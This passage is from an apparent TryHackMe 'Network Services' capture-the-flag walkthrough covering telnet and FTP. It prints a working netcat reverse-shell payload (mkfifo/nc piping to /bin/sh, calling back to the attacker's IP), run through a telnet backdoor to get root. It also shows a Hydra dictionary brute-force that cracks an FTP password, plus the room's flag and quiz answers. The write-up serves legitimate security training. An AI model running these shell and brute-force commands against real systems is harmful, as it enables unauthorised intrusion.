+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 209.59 seconds
+</span></span></code></pre></td></tr></table></div></div><ol><li>How many ports are open on the target machine?</li></ol><p><code>1</code></p><ol start=2><li>What port is this?</li></ol><p><code>8012</code></p><ol start=3><li>This port is unassigned, but still lists the protocol it&rsquo;s using, what protocol is this?</li></ol><p><code>tcp</code></p><ol start=4><li>Now re-run the nmap scan, without the -p- tag, how many ports show up as open?</li></ol><p><code>0</code></p><ol start=5><li>Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It&rsquo;s important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.</li></ol><p><code>No answer needed</code></p><ol start=6><li>Based on the title returned to us, what do we think this port could be used for?</li></ol><p><code>A Backdoor</code></p><ol start=7><li>Who could it belong to? Gathering possible usernames is an important step in enumeration.</li></ol><p><code>SKIDY</code></p><ol start=8><li>Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.</li></ol><h2 id=task-7-exploiting-telnet>Task 7 Exploiting Telnet<a hidden class=anchor aria-hidden=true href=#task-7-exploiting-telnet>#</a></h2><p><strong>Types of Telnet Exploit</strong></p><p>Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE&rsquo;s for Telnet client and server systems, however, so when exploiting you can check for those on:</p><ul><li><a href=https://www.cvedetails.com/>https://www.cvedetails.com/</a></li><li><a href=https://cve.mitre.org/>https://cve.mitre.org/</a></li></ul><p>A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.</p><p>However, you&rsquo;re far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.</p><p><strong>Method Breakdown</strong></p><p>So, from our enumeration stage, we know:</p><ul><li>There is a poorly hidden telnet service running on this machine</li><li>The service itself is marked &ldquo;backdoor&rdquo;</li><li>We have possible username of &ldquo;Skidy&rdquo; implicated</li></ul><p>Using this information, let&rsquo;s try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!</p><p><strong>Connecting to Telnet</strong></p><p>You can connect to a telnet server with the following syntax: &ldquo;<code>telnet [ip] [port]</code>&rdquo;</p><p>We&rsquo;re going to need to keep this in mind as we try and exploit this machine.</p><p><strong>What is a Reverse Shell?</strong></p><p><img loading=lazy src=https://i.imgur.com/EUC7VS6.png alt></p><p>A &ldquo;shell&rdquo; can simply be described as a piece of code or program which can be used to gain code or command execution on a device.</p><p>A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.</p><p>The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.</p><ol><li>Okay, let&rsquo;s try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.</li></ol><p><code>No answer needed</code></p><ol start=2><li>Great! It&rsquo;s an open telnet connection! What welcome message do we receive?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ telnet 10.10.221.224 8012
+</span></span><span class=line><span class=cl>Trying 10.10.221.224...
+</span></span><span class=line><span class=cl>Connected to 10.10.221.224.
+</span></span><span class=line><span class=cl>Escape character is &#39;^]&#39;.
+</span></span><span class=line><span class=cl>SKIDY&#39;S BACKDOOR. Type .HELP to view commands
+</span></span></code></pre></td></tr></table></div></div><p><code>SKIDY'S BACKDOOR.</code></p><ol start=3><li>Let&rsquo;s try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)</li></ol><p><code>N</code></p><ol start=4><li>Hmm&mldr; that&rsquo;s strange. Let&rsquo;s check to see if what we&rsquo;re typing is being executed as a system command.</li></ol><p><code>No answer needed</code></p><ol start=5><li>Start a tcpdump listener on your local machine using: &ldquo;sudo tcpdump ip proto \icmp -i tun0&rdquo; This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.</li></ol><p><code>No answer needed</code></p><ol start=6><li>Now, use the command &ldquo;ping [local tun0 ip] -c 1&rdquo; through the telnet session to see if we&rsquo;re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ ping 10.8.106.222 -c 1
+</span></span><span class=line><span class=cl>PING 10.8.106.222 (10.8.106.222) 56(84) bytes of data.
+</span></span><span class=line><span class=cl>64 bytes from 10.8.106.222: icmp_seq=1 ttl=64 time=0.027 ms
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--- 10.8.106.222 ping statistics ---
+</span></span><span class=line><span class=cl>1 packets transmitted, 1 received, 0% packet loss, time 0ms
+</span></span><span class=line><span class=cl>rtt min/avg/max/mdev = 0.027/0.027/0.027/0.000 ms
+</span></span></code></pre></td></tr></table></div></div><ol start=7><li>Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let&rsquo;s have some fun!</li><li>We&rsquo;re going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here&rsquo;s our syntax: &ldquo;<code>msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</code>&rdquo;</li></ol><ul><li><code>-p</code> = payload</li><li><code>lhost</code> = our local host IP address</li><li><code>lport</code> = the port to listen on</li><li><code>R</code> = export the payload in raw format</li></ul><p>What word does the generated payload start with?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Network</span> <span class=n>Services</span><span class=o>$</span> <span class=n>msfvenom</span> <span class=o>-</span><span class=n>p</span> <span class=n>cmd</span><span class=o>/</span><span class=n>unix</span><span class=o>/</span><span class=n>reverse_netcat</span> <span class=n>lhost</span><span class=o>=</span><span class=mf>10.8</span><span class=o>.</span><span class=mf>106.222</span> <span class=n>lport</span><span class=o>=</span><span class=mi>4444</span> <span class=n>R</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>No</span> <span class=n>platform</span> <span class=n>was</span> <span class=n>selected</span><span class=p>,</span> <span class=n>choosing</span> <span class=n>Msf</span><span class=p>::</span><span class=n>Module</span><span class=p>::</span><span class=n>Platform</span><span class=p>::</span><span class=n>Unix</span> <span class=n>from</span> <span class=n>the</span> <span class=n>payload</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>No</span> <span class=n>arch</span> <span class=n>selected</span><span class=p>,</span> <span class=n>selecting</span> <span class=n>arch</span><span class=p>:</span> <span class=n>cmd</span> <span class=n>from</span> <span class=n>the</span> <span class=n>payload</span>
+</span></span><span class=line><span class=cl><span class=n>No</span> <span class=n>encoder</span> <span class=n>specified</span><span class=p>,</span> <span class=n>outputting</span> <span class=n>raw</span> <span class=n>payload</span>
+</span></span><span class=line><span class=cl><span class=n>Payload</span> <span class=n>size</span><span class=p>:</span> <span class=mi>102</span> <span class=n>bytes</span>
+</span></span><span class=line><span class=cl><span class=n>mkfifo</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>itxhqvx</span><span class=p>;</span> <span class=n>nc</span> <span class=mf>10.8</span><span class=o>.</span><span class=mf>106.222</span> <span class=mi>4444</span> <span class=mi>0</span><span class=o>&lt;/</span><span class=n>tmp</span><span class=o>/</span><span class=n>itxhqvx</span> <span class=o>|</span> <span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span> <span class=o>&gt;/</span><span class=n>tmp</span><span class=o>/</span><span class=n>itxhqvx</span> <span class=mi>2</span><span class=o>&gt;&amp;</span><span class=mi>1</span><span class=p>;</span> <span class=n>rm</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>itxhqvx</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>mkfifo</code></p><ol start=9><li>Perfect. We&rsquo;re nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using: &ldquo;<code>nc -lvp [listening port]</code>&rdquo; What would the command look like for the listening port we selected in our payload?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ nc -lvp 4444
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 4444
+</span></span></code></pre></td></tr></table></div></div><p><code>nc -lvp 4444</code></p><ol start=10><li>Great! Now that&rsquo;s running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.RUN mkfifo /tmp/itxhqvx; nc 10.8.106.222 4444 0&lt;/tmp/itxhqvx | /bin/sh &gt;/tmp/itxhqvx 2&gt;&amp;1; rm /tmp/itxhqvx
+</span></span></code></pre></td></tr></table></div></div><p><code>No answer needed</code></p><ol><li>Success! What is the contents of flag.txt?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ nc -lvp 4444
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 4444
+</span></span><span class=line><span class=cl>Connection received on 10.10.221.224 56944
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root)
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>flag.txt
+</span></span><span class=line><span class=cl>cat flag.txt
+</span></span><span class=line><span class=cl>THM{y0u_g0t_th3_t3ln3t_fl4g}
+</span></span></code></pre></td></tr></table></div></div><p><code>THM{y0u_g0t_th3_t3ln3t_fl4g}</code></p><h2 id=task-8-understanding-ftp>Task 8 Understanding FTP<a hidden class=anchor aria-hidden=true href=#task-8-understanding-ftp>#</a></h2><p><strong>What is FTP?</strong></p><p>File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we&rsquo;ll come on to later- relays commands and data in a very efficient way.</p><p><strong>How does FTP work?</strong></p><p>A typical FTP session operates using two channels:</p><ul><li>a command (sometimes called the control) channel</li><li>a data channel.</li></ul><p>As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.</p><p>FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.</p><p>While the session is open, the client may execute FTP commands on the server.</p><p><strong>Active vs Passive</strong></p><p>The FTP server may support either Active or Passive connections, or both.</p><ul><li>In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it.</li><li>In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.</li></ul><p>This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn&rsquo;t be efficient for either large file transfers, or slow internet connections.</p><p><strong>More Details:</strong></p><p>You can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: <a href=https://www.ietf.org/rfc/rfc959.txt>https://www.ietf.org/rfc/rfc959.txt</a>. The IETF is one of a number of standards agencies, who define and regulate internet standards.</p><ol><li>What communications model does FTP use?</li></ol><p><code>client-server</code></p><ol start=2><li>What&rsquo;s the standard FTP port?</li></ol><p><code>21</code></p><ol start=3><li>How many modes of FTP connection are there?</li></ol><p><code>2</code></p><h2 id=task-9-enumerating-ftp>Task 9 Enumerating FTP<a hidden class=anchor aria-hidden=true href=#task-9-enumerating-ftp>#</a></h2><p><strong>Lets Get Started</strong></p><p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!</p><p><strong>Enumeration</strong></p><p>By now, I don&rsquo;t think I need to explain any further how enumeration is key when attacking network services and protocols. You should, by now, have enough experience with <strong>nmap</strong> to be able to port scan effectively. If you get stuck using any tool- you can always use &ldquo;<code>tool [-h / -help / --help]</code>&rdquo; to find out more about it&rsquo;s function and syntax. Equally, man pages are extremely useful for this purpose. They can be reached using &ldquo;<code>man [tool]</code>&rdquo;.</p><p><strong>Method</strong></p><p>We&rsquo;re going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.</p><p><strong>Resources</strong></p><p>As we&rsquo;re going to be logging in to an FTP server, we&rsquo;re going to need to make sure therre is an ftp client installed on the system. There should be one installed by default on most Linux operating systems, such as Kali or Parrot OS. You can test if there is one by typing &ldquo;ftp&rdquo; into the console. If you&rsquo;re bought to a prompt that says: &ldquo;ftp>&rdquo; Then you have a working FTP client on your system. If not, it&rsquo;s a simple matter of using &ldquo;sudo apt install ftp&rdquo; to install one.</p><p><strong>Alternative Enumeration Methods</strong></p><p>It&rsquo;s worth noting that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the &ldquo;cwd&rdquo; command for home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there&rsquo;s a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it&rsquo;s worth knowing about, as a way to exploit FTP.</p><p>This vulnerability is documented at: <a href=https://www.exploit-db.com/exploits/20745>https://www.exploit-db.com/exploits/20745</a></p><p>Now we understand our toolbox, let&rsquo;s do this.</p><ol><li>Run an nmap scan of your choice. How many ports are open on the target machine?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ sudo nmap -p- -sS -sC -sV -O 10.10.153.14
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 22:05 CET
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.153.14
+</span></span><span class=line><span class=cl>Host is up (0.033s latency).
+</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>21/tcp open  ftp     vsftpd 2.0.8 or later
+</span></span><span class=line><span class=cl>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span class=line><span class=cl>|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
+</span></span><span class=line><span class=cl>| ftp-syst:
+</span></span><span class=line><span class=cl>|   STAT:
+</span></span><span class=line><span class=cl>| FTP server status:
+</span></span><span class=line><span class=cl>|      Connected to ::ffff:10.8.106.222
+</span></span><span class=line><span class=cl>|      Logged in as ftp
+</span></span><span class=line><span class=cl>|      TYPE: ASCII
+</span></span><span class=line><span class=cl>|      No session bandwidth limit
+</span></span><span class=line><span class=cl>|      Session timeout in seconds is 300
+</span></span><span class=line><span class=cl>|      Control connection is plain text
+</span></span><span class=line><span class=cl>|      Data connections will be plain text
+</span></span><span class=line><span class=cl>|      At session startup, client count was 1
+</span></span><span class=line><span class=cl>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class=line><span class=cl>|_End of status
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=10/25%OT=21%CT=1%CU=43401%PV=Y%DS=2%DC=I%G=Y%TM=5F95E8
+</span></span><span class=line><span class=cl>OS:C7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)OP
+</span></span><span class=line><span class=cl>OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
+</span></span><span class=line><span class=cl>OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+</span></span><span class=line><span class=cl>OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+</span></span><span class=line><span class=cl>OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+</span></span><span class=line><span class=cl>OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+</span></span><span class=line><span class=cl>OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+</span></span><span class=line><span class=cl>OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+</span></span><span class=line><span class=cl>OS:D=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: Host: Welcome
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 62.92 seconds
+</span></span></code></pre></td></tr></table></div></div><p><code>2</code></p><ol start=2><li>What port is ftp running on?</li></ol><p><code>21</code></p><ol start=3><li>What variant of FTP is running on it?</li></ol><p><code>vsftpd</code></p><ol start=4><li>Great, now we know what type of FTP server we&rsquo;re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing &ldquo;ftp [IP]&rdquo; into the console, and entering &ldquo;anonymous&rdquo;, and no password when prompted. What is the name of the file in the anonymous FTP directory?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ ftp 10.10.153.14
+</span></span><span class=line><span class=cl>Connected to 10.10.153.14.
+</span></span><span class=line><span class=cl>220 Welcome to the administrator FTP service.
+</span></span><span class=line><span class=cl>Name (10.10.153.14:kali): anonymous
+</span></span><span class=line><span class=cl>331 Please specify the password.
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>230 Login successful.
+</span></span><span class=line><span class=cl>Remote system type is UNIX.
+</span></span><span class=line><span class=cl>Using binary mode to transfer files.
+</span></span><span class=line><span class=cl>ftp&gt; ls
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Here comes the directory listing.
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
+</span></span><span class=line><span class=cl>226 Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt;
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>What do we think a possible username could be?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ftp&gt; get PUBLIC_NOTICE.txt
+</span></span><span class=line><span class=cl>local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
+</span></span><span class=line><span class=cl>226 Transfer complete.
+</span></span><span class=line><span class=cl>353 bytes received in 0.00 secs (118.1785 kB/s)
+</span></span><span class=line><span class=cl>ftp&gt;
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ cat PUBLIC_NOTICE.txt
+</span></span><span class=line><span class=cl>===================================
+</span></span><span class=line><span class=cl>MESSAGE FROM SYSTEM ADMINISTRATORS
+</span></span><span class=line><span class=cl>===================================
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hello,
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>I hope everyone is aware that the
+</span></span><span class=line><span class=cl>FTP server will not be available
+</span></span><span class=line><span class=cl>over the weekend- we will be
+</span></span><span class=line><span class=cl>carrying out routine system
+</span></span><span class=line><span class=cl>maintenance. Backups will be
+</span></span><span class=line><span class=cl>made to my account so I reccomend
+</span></span><span class=line><span class=cl>encrypting any sensitive data.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Cheers,
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Mike
+</span></span></code></pre></td></tr></table></div></div><p><code>Mike</code></p><ol start=6><li>Great! Now we&rsquo;ve got details about the FTP server and, crucially, a possible username. Let&rsquo;s see what we can do with that&mldr;</li></ol><p><code>No answer needed</code></p><h2 id=task-10-exploiting-ftp>Task 10 Exploiting FTP<a hidden class=anchor aria-hidden=true href=#task-10-exploiting-ftp>#</a></h2><p><strong>Types of FTP Exploit</strong></p><p>Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.</p><p>With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by JSCape demonstrates and explains this process using APR-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.</p><p>When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.</p><p><strong>Method Breakdown</strong></p><p>So, from our enumeration stage, we know:</p><ul><li>There is an FTP server running on this machine</li><li>We have a possible username</li></ul><p>Using this information, let&rsquo;s try and bruteforce the password of the FTP Server.</p><p><strong>Hydra</strong></p><p>Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.</p><p>The syntax for the command we&rsquo;re going to use to find the passwords is this:
+&ldquo;<code>hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp</code>&rdquo;</p><p>Let&rsquo;s break it down:</p><table><thead><tr><th>SECTION</th><th>FUNCTION</th></tr></thead><tbody><tr><td>hydra</td><td>Runs the hydra tool</td></tr><tr><td>-t 4</td><td>Number of parallel connections per target</td></tr><tr><td>-l [user]</td><td>Points to the user who&rsquo;s account you&rsquo;re trying to compromise</td></tr><tr><td>-P [path to dictionary]</td><td>Points to the file containing the list of possible passwords</td></tr><tr><td>-vV</td><td>Sets verbose mode to very verbose, shows the login+pass combination for each attempt</td></tr><tr><td>[machine IP]</td><td>The IP address of the target machine</td></tr><tr><td>ftp / protocol</td><td>Sets the protocol</td></tr></tbody></table><p>Let&rsquo;s crack some passwords!</p><ol><li>What is the password for the user &ldquo;mike&rdquo;?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt 10.10.153.14 ftp
+</span></span><span class=line><span class=cl>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-25 22:13:09
+</span></span><span class=line><span class=cl>[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+</span></span><span class=line><span class=cl>[DATA] attacking ftp://10.10.153.14:21/
+</span></span><span class=line><span class=cl>[21][ftp] host: 10.10.153.14   login: mike   password: password
+</span></span><span class=line><span class=cl>1 of 1 target successfully completed, 1 valid password found
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-25 22:13:17
+</span></span></code></pre></td></tr></table></div></div><p><code>password</code></p><ol start=2><li>Bingo! Now, let&rsquo;s connect to the FTP server as this user using &ldquo;ftp [IP]&rdquo; and entering the credentials when prompted</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ ftp 10.10.153.14
+</span></span><span class=line><span class=cl>Connected to 10.10.153.14.
+</span></span><span class=line><span class=cl>220 Welcome to the administrator FTP service.
+</span></span><span class=line><span class=cl>Name (10.10.153.14:kali): mike
+</span></span><span class=line><span class=cl>331 Please specify the password.
